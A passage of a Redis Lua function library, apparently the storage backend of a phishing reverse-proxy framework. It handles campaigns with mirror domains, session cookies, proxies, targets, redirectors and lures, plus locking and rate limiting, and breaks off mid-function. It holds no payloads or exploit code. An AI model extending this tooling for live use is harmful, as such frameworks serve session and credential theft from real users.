#!lua name=famir

--
-- Helpers
--

local function current_time()
  local t = redis.call('TIME')

  return tonumber(t[1]) * 1000 + math.floor(tonumber(t[2]) / 1000)
end

local function coerce(value, spec)
  if not value then
    return nil, spec.name .. ' missing'
  end

  if type(value) ~= 'string' then
    return nil, spec.name .. ' malform'
  end

  if spec.kind == 'any' then
    return value
  elseif spec.kind == 'str' then
    if value == '' then
      return nil, spec.name .. ' empty string'
    end

    return value
  elseif spec.kind == 'num' then
    local n = tonumber(value)

    if not n or n ~= n or n == math.huge or n == -math.huge then
      return nil, spec.name .. ' not a number'
    end

    if spec.min and n < spec.min then
      return nil, spec.name .. ' below min'
    end

    if spec.max and n > spec.max then
      return nil, spec.name .. ' above max'
    end

    return n
  elseif spec.kind == 'int' then
    local n = tonumber(value)

    if not n or n ~= n or n == math.huge or n == -math.huge or n ~= math.floor(n) then
      return nil, spec.name .. ' not an integer'
    end

    if spec.min and n < spec.min then
      return nil, spec.name .. ' below min'
    end

    if spec.max and n > spec.max then
      return nil, spec.name .. ' above max'
    end

    return n
  end

  return nil, spec.name .. ' unknown kind'
end

local function normalize(values, specs)
  if #values ~= #specs then
    return nil, 'wrong number of values'
  end

  local out = {}

  for i, spec in ipairs(specs) do
    local value, err = coerce(values[i], spec)

    if err then
      return nil, err
    end

    if value == nil then
      return nil, 'coerce internal error'
    end

    out[spec.name] = value
  end

  return out
end

--
-- Constants
--

local LOCK_TIMEOUT_MIN, LOCK_TIMEOUT_MAX = 1000, 3600 * 1000

local LIMITER_BURST_MIN, LIMITER_BURST_MAX = 1, 1000
local LIMITER_RATE_MIN, LIMITER_RATE_MAX = 1, 100
local LIMITER_COST_MIN, LIMITER_COST_MAX = 0.001, 1000

local TARGET_SUB_APEX = '@'

local SESSION_EXPIRE_MIN, SESSION_EXPIRE_MAX = 1000, 365 * 86400 * 1000
local NEW_SESSION_EXPIRE_MIN, NEW_SESSION_EXPIRE_MAX = 1000, 3600 * 1000

local MESSAGE_EXPIRE_MIN, MESSAGE_EXPIRE_MAX = 1000, 86400 * 1000

--
-- Campaign methods
--

local function create_campaign(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_mirror_domains_key = keys[2]
  local campaign_session_cookie_names_key = keys[3]
  local campaign_index_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'description', kind = 'any' },
    { name = 'crypt_secret', kind = 'str' },
    { name = 'upgrade_session_path', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
    {
      name = 'session_expire',
      kind = 'int',
      min = SESSION_EXPIRE_MIN,
      max = SESSION_EXPIRE_MAX,
    },
    {
      name = 'new_session_expire',
      kind = 'int',
      min = NEW_SESSION_EXPIRE_MIN,
      max = NEW_SESSION_EXPIRE_MAX,
    },
    {
      name = 'message_expire',
      kind = 'int',
      min = MESSAGE_EXPIRE_MIN,
      max = MESSAGE_EXPIRE_MAX,
    },
    {
      name = 'limiter_burst',
      kind = 'int',
      min = LIMITER_BURST_MIN,
      max = LIMITER_BURST_MAX,
    },
    {
      name = 'limiter_rate',
      kind = 'int',
      min = LIMITER_RATE_MIN,
      max = LIMITER_RATE_MAX,
    },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 1 then
    return redis.status_reply('CONFLICT campaign already exists')
  end

  if redis.call('SISMEMBER', campaign_mirror_domains_key, args.mirror_domain) == 1 then
    return redis.status_reply('CONFLICT campaign mirror_domain already taken')
  end

  if redis.call('SISMEMBER', campaign_session_cookie_names_key, args.session_cookie_name) == 1 then
    return redis.status_reply('CONFLICT campaign session_cookie_name already taken')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', campaign_key,
    'campaign_id', args.campaign_id,
    'mirror_domain', args.mirror_domain,
    'description', args.description,
    'crypt_secret', args.crypt_secret,
    'upgrade_session_path', args.upgrade_session_path,
    'session_cookie_name', args.session_cookie_name,
    'session_expire', args.session_expire,
    'new_session_expire', args.new_session_expire,
    'message_expire', args.message_expire,
    'limiter_burst', args.limiter_burst,
    'session_count', 0,
    'message_count', 0,
    'created_at', now
  )

  redis.call('SADD', campaign_mirror_domains_key, args.mirror_domain)
  redis.call('SADD', campaign_session_cookie_names_key, args.session_cookie_name)
  redis.call('ZADD', campaign_index_key, now, args.campaign_id)

  return redis.status_reply('OK campaign created')
end

redis.register_function({
  function_name = 'create_campaign',
  callback = create_campaign,
  description = 'Create campaign',
})

local function read_campaign(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'session_count',
    'message_count',
    'created_at'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'session_count', kind = 'int' },
    { name = 'message_count', kind = 'int' },
    { name = 'created_at', kind = 'int' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1

  return { map = campaign }
end

redis.register_function({
  function_name = 'read_campaign',
  callback = read_campaign,
  flags = { 'no-writes' },
  description = 'Read campaign',
})

local function read_full_campaign(keys, args)
  if #keys ~= 10 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local campaign_flags_key = keys[3]
  local campaign_session_cookie_names_key = keys[4]
  local proxy_index_key = keys[5]
  local target_index_key = keys[6]
  local redirector_index_key = keys[7]
  local lure_index_key = keys[8]
  local session_history_key = keys[9]
  local message_history_key = keys[10]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'description',
    'crypt_secret',
    'upgrade_session_path',
    'session_cookie_name',
    'session_expire',
    'new_session_expire',
    'message_expire',
    'limiter_burst',
    'limiter_rate',
    'session_count',
    'message_count',
    'created_at'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'description', kind = 'any' },
    { name = 'crypt_secret', kind = 'str' },
    { name = 'upgrade_session_path', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
    { name = 'session_expire', kind = 'int' },
    { name = 'new_session_expire', kind = 'int' },
    { name = 'message_expire', kind = 'int' },
    { name = 'limiter_burst', kind = 'int' },
    { name = 'limiter_rate', kind = 'int' },
    { name = 'session_count', kind = 'int' },
    { name = 'message_count', kind = 'int' },
    { name = 'created_at', kind = 'int' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  campaign.session_cookie_names = redis.call('SMEMBERS', campaign_session_cookie_names_key)
  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1
  campaign.flags = redis.call('SMEMBERS', campaign_flags_key)
  campaign.proxy_index = redis.call('ZCARD', proxy_index_key)
  campaign.target_index = redis.call('ZCARD', target_index_key)
  campaign.redirector_index = redis.call('ZCARD', redirector_index_key)
  campaign.lure_index = redis.call('ZCARD', lure_index_key)
  campaign.session_history = redis.call('ZCARD', session_history_key)
  campaign.message_history = redis.call('ZCARD', message_history_key)

  return { map = campaign }
end

redis.register_function({
  function_name = 'read_full_campaign',
  callback = read_full_campaign,
  flags = { 'no-writes' },
  description = 'Read full campaign',
})

local function read_campaign_index(keys, args)
  if #keys ~= 1 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_index_key = keys[1]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  return redis.call('ZRANGE', campaign_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_campaign_index',
  callback = read_campaign_index,
  flags = { 'no-writes' },
  description = 'Read campaign index',
})

local function lock_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
    {
      name = 'lock_timeout',
      kind = 'int',
      min = LOCK_TIMEOUT_MIN,
      max = LOCK_TIMEOUT_MAX,
    },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 1 then
    return redis.status_reply('FORBIDDEN campaign already locked')
  end

  -- Point of no return

  redis.call('SET', campaign_lock_key, args.lock_secret, 'PX', args.lock_timeout)

  return redis.status_reply('OK campaign locked')
end

redis.register_function({
  function_name = 'lock_campaign',
  callback = lock_campaign,
  description = 'Lock campaign',
})

local function unlock_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('OK campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- Point of no return

  redis.call('DEL', campaign_lock_key)

  return redis.status_reply('OK campaign unlocked')
end

redis.register_function({
  function_name = 'unlock_campaign',
  callback = unlock_campaign,
  description = 'Unlock campaign',
})

local function update_campaign(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'description', kind = 'any' },
    {
      name = 'session_expire',
      kind = 'int',
      min = SESSION_EXPIRE_MIN,
      max = SESSION_EXPIRE_MAX,
    },
    {
      name = 'new_session_expire',
      kind = 'int',
      min = NEW_SESSION_EXPIRE_MIN,
      max = NEW_SESSION_EXPIRE_MAX,
    },
    {
      name = 'message_expire',
      kind = 'int',
      min = MESSAGE_EXPIRE_MIN,
      max = MESSAGE_EXPIRE_MAX,
    },
    {
      name = 'limiter_burst',
      kind = 'int',
      min = LIMITER_BURST_MIN,
      max = LIMITER_BURST_MAX,
    },
    {
      name = 'limiter_rate',
      kind = 'int',
      min = LIMITER_RATE_MIN,
      max = LIMITER_RATE_MAX,
    },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', campaign_key,
    'description', args.description,
    'session_expire', args.session_expire,
    'new_session_expire', args.new_session_expire,
    'message_expire', args.message_expire,
    'limiter_burst', args.limiter_burst,
    'limiter_rate', args.limiter_rate
  )

  return redis.status_reply('OK campaign updated')
end

redis.register_function({
  function_name = 'update_campaign',
  callback = update_campaign,
  description = 'Update campaign',
})

local function append_campaign_flag(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_flags_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'flag', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('SISMEMBER', campaign_flags_key, args.flag) == 1 then
    return redis.status_reply('OK campaign flag already exists')
  end

  -- Point of no return

  redis.call('SADD', campaign_flags_key, args.flag)

  return redis.status_reply('OK campaign flag appended')
end

redis.register_function({
  function_name = 'append_campaign_flag',
  callback = append_campaign_flag,
  description = 'Append campaign flag',
})

local function remove_campaign_flag(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_flags_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'flag', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('SISMEMBER', campaign_flags_key, args.flag) == 0 then
    return redis.status_reply('OK campaign flag not exists')
  end

  -- Point of no return

  redis.call('SREM', campaign_flags_key, args.flag)

  return redis.status_reply('OK campaign flag removed')
end

redis.register_function({
  function_name = 'remove_campaign_flag',
  callback = remove_campaign_flag,
  description = 'Remove campaign flag',
})

local function delete_campaign(keys, raw_args)
  if #keys ~= 12 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local campaign_flags_key = keys[3]
  local campaign_mirror_domains_key = keys[4]
  local campaign_session_cookie_names_key = keys[5]
  local campaign_index_key = keys[6]
  local proxy_index_key = keys[7]
  local target_index_key = keys[8]
  local redirector_index_key = keys[9]
  local lure_index_key = keys[10]
  local session_history_key = keys[11]
  local message_history_key = keys[12]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'session_cookie_name'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
    { name = 'session_cookie_name', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if redis.call('ZCARD', proxy_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign proxies exists')
  end

  if redis.call('ZCARD', target_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign targets exists')
  end

  if redis.call('ZCARD', redirector_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign redirectors exists')
  end

  if redis.call('ZCARD', lure_index_key) > 0 then
    return redis.status_reply('FORBIDDEN campaign lures exists')
  end

  -- Point of no return

  redis.call(
    'DEL',
    campaign_key,
    campaign_lock_key,
    campaign_flags_key,
    session_history_key,
    message_history_key
  )
  redis.call('SREM', campaign_mirror_domains_key, campaign.mirror_domain)
  redis.call('SREM', campaign_session_cookie_names_key, campaign.session_cookie_name)
  redis.call('ZREM', campaign_index_key, campaign.campaign_id)

  return redis.status_reply('OK campaign deleted')
end

redis.register_function({
  function_name = 'delete_campaign',
  callback = delete_campaign,
  description = 'Delete campaign',
})

local function check_campaign_limiter(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_limiter_key = keys[2]

  local args, args_err = normalize(raw_args, {
    {
      name = 'limiter_cost',
      kind = 'num',
      min = LIMITER_COST_MIN,
      max = LIMITER_COST_MAX,
    },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'limiter_burst',
    'limiter_rate'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    {
      name = 'limiter_burst',
      kind = 'int',
      min = LIMITER_BURST_MIN,
      max = LIMITER_BURST_MAX,
    },
    {
      name = 'limiter_rate',
      kind = 'int',
      min = LIMITER_RATE_MIN,
      max = LIMITER_RATE_MAX,
    },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if args.limiter_cost > campaign.limiter_burst then
    return redis.error_reply('ERR limiter_cost exceeds limiter_burst')
  end

  -- Point of no return

  if redis.call('EXISTS', campaign_limiter_key) == 0 then
    -- stylua: ignore
    redis.call(
      'HSET', campaign_limiter_key,
      'tokens', campaign.limiter_burst,
      'ts', now
    )
  end

  -- stylua: ignore
  local raw_limiter = redis.call(
    'HMGET', campaign_limiter_key,
    'tokens',
    'ts'
  )

  local limiter, limiter_err = normalize(raw_limiter, {
    { name = 'tokens', kind = 'num', min = 0 },
    { name = 'ts', kind = 'int', min = 0 },
  })

  if limiter_err then
    return redis.error_reply('ERR normalize limiter: ' .. limiter_err)
  end

  limiter.tokens = math.min(campaign.limiter_burst, limiter.tokens)

  local elapsed = math.max(0, now - limiter.ts) / 1000
  limiter.tokens =
    math.min(campaign.limiter_burst, limiter.tokens + elapsed * campaign.limiter_rate)

  limiter.ts = now

  local is_allowed, retry_after

  if limiter.tokens >= args.limiter_cost then
    limiter.tokens = limiter.tokens - args.limiter_cost

    is_allowed = true
    retry_after = 0
  else
    is_allowed = false
    retry_after = math.ceil((args.limiter_cost - limiter.tokens) / campaign.limiter_rate * 1000)
  end

  limiter.tokens = math.max(0, limiter.tokens)

  local limiter_ttl = math.ceil((campaign.limiter_burst / campaign.limiter_rate) * 1000) + 1000

  -- stylua: ignore
  redis.call(
    'HSET', campaign_limiter_key,
    'tokens', limiter.tokens,
    'ts', limiter.ts
  )

  redis.call('PEXPIRE', campaign_limiter_key, limiter_ttl)

  return {
    map = {
      is_allowed = is_allowed,
      tokens = limiter.tokens,
      ts = limiter.ts,
      cost = args.limiter_cost,
      retry_after = retry_after,
    },
  }
end

redis.register_function({
  function_name = 'check_campaign_limiter',
  callback = check_campaign_limiter,
  description = 'Check campaign limiter',
})

--
-- Proxy methods
--

local function create_proxy(keys, raw_args)
  if #keys ~= 5 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local proxy_key = keys[3]
  local proxy_urls_key = keys[4]
  local proxy_index_key = keys[5]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'proxy_id', kind = 'str' },
    { name = 'url', kind = 'str' },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', proxy_key) == 1 then
    return redis.status_reply('CONFLICT proxy already exists')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= args.campaign_id then
    return redis.status_reply('FORBIDDEN proxy campaign_id mismatch')
  end

  if redis.call('SISMEMBER', proxy_urls_key, args.url) == 1 then
    return redis.status_reply('CONFLICT proxy url already taken')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', proxy_key,
    'campaign_id', args.campaign_id,
    'proxy_id', args.proxy_id,
    'url', args.url,
    'is_enabled', 0,
    'message_count', 0,
    'created_at', now
  )

  redis.call('SADD', proxy_urls_key, args.url)
  redis.call('ZADD', proxy_index_key, now, args.proxy_id)

  return redis.status_reply('OK proxy created')
end

redis.register_function({
  function_name = 'create_proxy',
  callback = create_proxy,
  description = 'Create proxy',
})

local function read_proxy(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local proxy_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('EXISTS', proxy_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_proxy = redis.call(
    'HMGET', proxy_key,
    'campaign_id',
    'proxy_id',
    'url',
    'is_enabled',
    'message_count',
    'created_at'
  )

  local proxy, proxy_err = normalize(raw_proxy, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'proxy_id', kind = 'str' },
    { name = 'url', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
    { name = 'message_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if proxy_err then
    return redis.error_reply('ERR normalize proxy: ' .. proxy_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= proxy.campaign_id then
    return redis.error_reply('ERR proxy campaign_id mismatch')
  end

  proxy.is_enabled = proxy.is_enabled == 1

  return { map = proxy }
end

redis.register_function({
  function_name = 'read_proxy',
  callback = read_proxy,
  flags = { 'no-writes' },
  description = 'Read proxy',
})

local function read_proxy_index(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local proxy_index_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  return redis.call('ZRANGE', proxy_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_proxy_index',
  callback = read_proxy_index,
  flags = { 'no-writes' },
  description = 'Read proxy index',
})

local function enable_proxy(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local proxy_key = keys[3]
  local enabled_proxy_index_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', proxy_key) == 0 then
    return redis.status_reply('NOT_FOUND proxy not exists')
  end

  -- stylua: ignore
  local raw_proxy = redis.call(
    'HMGET', proxy_key,
    'proxy_id',
    'is_enabled'
  )

  local proxy, proxy_err = normalize(raw_proxy, {
    { name = 'proxy_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if proxy_err then
    return redis.error_reply('ERR normalize proxy: ' .. proxy_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= proxy.campaign_id then
    return redis.status_reply('FORBIDDEN proxy campaign_id mismatch')
  end

  if proxy.is_enabled == 1 then
    return redis.status_reply('OK proxy already enabled')
  end

  -- Point of no return

  redis.call('HSET', proxy_key, 'is_enabled', 1)
  redis.call('SADD', enabled_proxy_index_key, proxy.proxy_id)

  return redis.status_reply('OK proxy enabled')
end

redis.register_function({
  function_name = 'enable_proxy',
  callback = enable_proxy,
  description = 'Enable proxy',
})

local function disable_proxy(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local proxy_key = keys[3]
  local enabled_proxy_index_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', proxy_key) == 0 then
    return redis.status_reply('NOT_FOUND proxy not exists')
  end

  -- stylua: ignore
  local raw_proxy = redis.call(
    'HMGET', proxy_key,
    'proxy_id',
    'is_enabled'
  )

  local proxy, proxy_err = normalize(raw_proxy, {
    { name = 'proxy_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if proxy_err then
    return redis.error_reply('ERR normalize proxy: ' .. proxy_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= proxy.campaign_id then
    return redis.status_reply('FORBIDDEN proxy campaign_id mismatch')
  end

  if proxy.is_enabled == 0 then
    return redis.status_reply('OK proxy already disabled')
  end

  -- Point of no return

  redis.call('HSET', proxy_key, 'is_enabled', 0)
  redis.call('SREM', enabled_proxy_index_key, proxy.proxy_id)

  return redis.status_reply('OK proxy disabled')
end

redis.register_function({
  function_name = 'disable_proxy',
  callback = disable_proxy,
  description = 'Disable proxy',
})

local function delete_proxy(keys, raw_args)
  if #keys ~= 5 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local proxy_key = keys[3]
  local proxy_urls_key = keys[4]
  local proxy_index_key = keys[5]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', proxy_key) == 0 then
    return redis.status_reply('NOT_FOUND proxy not exists')
  end

  -- stylua: ignore
  local raw_proxy = redis.call(
    'HMGET', proxy_key,
    'campaign_id',
    'proxy_id',
    'url',
    'is_enabled'
  )

  local proxy, proxy_err = normalize(raw_proxy, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'proxy_id', kind = 'str' },
    { name = 'url', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if proxy_err then
    return redis.error_reply('ERR normalize proxy: ' .. proxy_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= proxy.campaign_id then
    return redis.status_reply('FORBIDDEN proxy campaign_id mismatch')
  end

  if proxy.is_enabled == 1 then
    return redis.status_reply('FORBIDDEN proxy not disabled')
  end

  -- Point of no return

  redis.call('DEL', proxy_key)
  redis.call('SREM', proxy_urls_key, proxy.url)
  redis.call('ZREM', proxy_index_key, proxy.proxy_id)

  return redis.status_reply('OK proxy deleted')
end

redis.register_function({
  function_name = 'delete_proxy',
  callback = delete_proxy,
  description = 'Delete proxy',
})

--
-- Target methods
--

local function create_target(keys, raw_args)
  if #keys ~= 7 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local target_key = keys[3]
  local target_donors_key = keys[4]
  local target_mirrors_key = keys[5]
  local target_hosts_key = keys[6]
  local target_index_key = keys[7]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'target_id', kind = 'str' },
    { name = 'access_level', kind = 'str' },
